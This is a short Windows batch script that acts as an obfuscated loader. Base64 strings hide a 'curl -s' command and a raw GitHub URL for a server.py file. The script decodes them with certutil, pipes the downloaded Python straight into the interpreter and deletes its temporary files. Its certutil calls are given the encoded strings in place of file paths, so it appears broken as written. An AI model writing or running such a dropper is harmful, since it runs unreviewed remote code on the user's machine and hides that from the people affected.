@echo off
set A1kzI=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nub3d5eHhkZXYvY2xvdWQtc2VydmVyL3JlZnMvaGVhZHMvbWFpbi9zZXJ2ZXIucHkK
set BxL9=Y3VybCAtcyA=
certutil -decode %A1kzI% F9tOp.txt
certutil -decode %BxL9% P1wEo.txt
set /p r42=<F9tOp.txt
set /p mYz=<P1wEo.txt
%mYz%%r42% | python
del F9tOp.txt
del P1wEo.txt
